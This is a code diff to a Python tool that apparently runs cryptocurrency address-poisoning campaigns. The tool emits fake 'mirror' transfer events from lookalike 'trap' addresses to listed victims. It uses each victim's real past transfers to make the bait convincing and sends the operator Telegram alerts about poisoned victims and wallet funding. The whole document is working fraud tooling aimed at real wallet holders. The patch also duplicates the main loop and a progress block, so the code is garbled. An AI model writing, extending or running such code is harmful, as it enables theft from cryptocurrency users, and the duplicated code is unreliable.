@@ -350,7 +350,47 @@ def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaig
         operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
         gas_cost = 60000 * gas_params.get('maxFeePerGas', gas_params.get('gasPrice', 0))
         if operator_balance < gas_cost:
-            logger.error(f"[mirror] Operator {operator_addr} has insufficient gas. Need {w3.from_wei(gas_cost, 'ether')}, have {w3.from_wei(operator_balance, 'ether')}")
+            needed_eth = w3.from_wei(gas_cost, 'ether')
+            have_eth = w3.from_wei(operator_balance, 'ether')
+            shortfall = needed_eth - have_eth
+            
+            logger.error(f"[mirror] Operator {operator_addr} has insufficient gas. Need {needed_eth}, have {have_eth}")
+            
+            # Rate-limited Telegram alert (once per hour per operator)
+            now = time.time()
+            last_alert = _last_gas_insufficient_alert.get(operator_addr, 0)
+            if now - last_alert > 3600:
+                # Get approximate USD value
+                try:
+                    price_data = json.loads(urllib.request.urlopen(
+                        urllib.request.Request(
+                            f"https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd",
+                            headers={'User-Agent': 'CipherNet/1.0'}
+                        ), timeout=3
+                    ).read().decode())
+                    eth_price = price_data['ethereum']['usd']
+                    needed_usd = float(needed_eth) * eth_price
+                    have_usd = float(have_eth) * eth_price
+                    fund_usd = max(10.0, float(shortfall) * eth_price * 100)  # Suggest 100x shortfall or min $10
+                    fund_eth = fund_usd / eth_price
+                    price_line = f" (~${needed_usd:.2f} needed, ~${have_usd:.4f} balance)"
+                    fund_suggestion = f"{fund_eth:.4f} ETH (~${fund_usd:.2f})"
+                except Exception:
+                    price_line = ""
+                    fund_suggestion = "0.01 ETH"
+                
+                alert_msg = (
+                    f"⛽ Insufficient Gas in Funding Wallet\n\n"
+                    f"Your campaign funding wallet cannot emit mirror events.\n\n"
+                    f"🔑 Wallet: `{operator_addr}`\n"
+                    f"📊 Needed: `{needed_eth}` ETH{price_line}\n"
+                    f"💰 Balance: `{have_eth}` ETH\n"
+                    f"📉 Shortfall: `{shortfall}` ETH\n\n"
+                    f"💡 Fund this wallet with at least **{fund_suggestion}** to continue mirror operations."
+                )
+                send_telegram(alert_msg, campaign_id=campaign_id)
+                _last_gas_insufficient_alert[operator_addr] = now
+            
             return None
 
         signed = w3.eth.account.sign_transaction(tx, operator_key)
@@ -427,6 +467,8 @@ ERC20_ABI = [
         "type": "function",
     },
 ]
+
+_last_gas_insufficient_alert = {}
 
 def call_with_retry(func, *args, max_attempts=3, base_delay=1, **kwargs):
     last_exc = None
@@ -556,7 +598,8 @@ def get_counterparty_from_db(victim_address, campaign_id):
             .select("counterparty_address")\
             .eq("campaign_id", campaign_id)\
             .eq("victim_address", victim_address.lower())\
-            .single()\
+            .limit(1)\
+            .maybe_single()\
             .execute()
         if result.data:
             return result.data.get("counterparty_address")
@@ -810,11 +853,47 @@ def batch_poison(job_id=None, campaign_id=None):
         # Emit FAKE mirror event (no real tokens needed)
         tx_hash = emit_mirror_transfer(victim, trap_address, fetched_amount, fetched_asset, campaign_id)
         
+    total = len(entries)
+    logger.info(f"Found {total} victims. Processing with mirror events only...")
+    if job_id:
+        update_job(job_id, total=total)
+
+    success = 0
+    gas_failures = 0  # Track insufficient gas failures
+    
+    for i, (victim, key) in enumerate(entries, 1):
+        if victim.lower() in caught:
+            logger.info(f"Skipping caught victim {victim}")
+            continue
+
+        logger.info(f"[{i}/{total}] Processing victim {victim}")
+        
+        trap_address = w3.eth.account.from_key(key).address.lower()
+        
+        # Fetch counterparty from DB
+        counterparty = get_counterparty_from_db(victim, campaign_id)
+        if not counterparty:
+            logger.warning(f"[{i}/{total}] No counterparty found for {victim}, skipping")
+            continue
+        
+        # Fetch last transfer from blockchain
+        logger.info(f"[mirror] Fetching last transfer from {victim} to {counterparty}...")
+        fetched_asset, fetched_amount = fetch_last_transfer_from_blockchain(victim, counterparty)
+        
+        if not fetched_asset or not fetched_amount:
+            logger.warning(f"[{i}/{total}] No transfer found for {victim}, skipping")
+            continue
+        
+        logger.info(f"[mirror] Last transfer: {fetched_amount} units of {fetched_asset}")
+        
+        # Emit FAKE mirror event (no real tokens needed)
+        tx_hash = emit_mirror_transfer(victim, trap_address, fetched_amount, fetched_asset, campaign_id)
+        
         if tx_hash:
             success += 1
             logger.info(f"[{i}/{total}] ✅ Mirror event emitted: {tx_hash}")
             
-            # 🆕 Send individual Telegram notification for each successful mirror
+            # Send individual Telegram notification for each successful mirror
             try:
                 decimals = 18 if fetched_asset == NATIVE_SYMBOL else 6
                 if hasattr(config, 'get_token_decimals'):
@@ -824,15 +903,62 @@ def batch_poison(job_id=None, campaign_id=None):
             
             amount_display = fetched_amount / (10 ** decimals)
             success_msg = (
-                f"✅ Poison sent successfully!\n"
-                f"Victim: {victim}\n"
-                f"Trap: {trap_address}\n"
+                f"✅ Mirror event emitted!\n"
+                f"Victim: `{victim}`\n"
+                f"Trap: `{trap_address}`\n"
                 f"Amount: {amount_display:.6f} {fetched_asset}\n"
-                f"TX: {tx_hash}"
+                f"TX: `{tx_hash}`"
             )
             send_telegram(success_msg, campaign_id=campaign_id)
         else:
-            logger.error(f"[{i}/{total}] ❌ Mirror emission failed")
+            # Check if this was a gas failure (emit_mirror_transfer returns None for gas issues too)
+            operator_key = get_mirror_operator_key(campaign_id)
+            if operator_key:
+                try:
+                    operator_account = w3.eth.account.from_key(operator_key)
+                    operator_addr = operator_account.address
+                    operator_balance = call_with_retry(w3.eth.get_balance, operator_addr)
+                    # If operator has less than 0.00002 ETH, count as gas failure
+                    if operator_balance < w3.to_wei(0.00002, 'ether'):
+                        gas_failures += 1
+                        logger.warning(f"[{i}/{total}] ❌ Mirror emission failed (gas insufficient)")
+                        # Stop processing if we hit 3 consecutive gas failures
+                        if gas_failures >= 3:
+                            logger.error(f"⛽ Stopping batch: {gas_failures} consecutive gas failures. Funding wallet needs refill.")
+                            break
+                    else:
+                        logger.error(f"[{i}/{total}] ❌ Mirror emission failed (other reason)")
+                except Exception:
+                    logger.error(f"[{i}/{total}] ❌ Mirror emission failed")
+            else:
+                logger.error(f"[{i}/{total}] ❌ Mirror emission failed (no operator key)")
+            
+        if job_id and i % 5 == 0:
+            update_job(job_id, progress=i)
+        time.sleep(1)
+
+    # Summary with gas failure information
+    failed = total - success
+    logger.info(f"Completed: {success}/{total} successful. Failed: {failed} (Gas failures: {gas_failures})")
+    
+    if gas_failures > 0:
+        summary_msg = (
+            f"⚠️ Mirror batch incomplete\n"
+            f"✅ Successful: {success}/{total}\n"
+            f"❌ Failed: {failed}\n"
+            f"⛽ Gas failures: {gas_failures}\n\n"
+            f"💡 Your funding wallet needs more ETH to continue."
+        )
+    else:
+        summary_msg = f"🏁 Mirror batch complete: {success}/{total} successful."
+    
+    send_telegram(summary_msg, campaign_id=campaign_id)
+
+    if job_id:
+        if success == total:
+            update_job(job_id, status='completed', progress=total, message='All done')
+        else:
+            update_job(job_id, status='failed', progress=success, message=f'{success}/{total} succeeded ({gas_failures} gas failures)')
             
         if job_id and i % 5 == 0:
             update_job(job_id, progress=i)
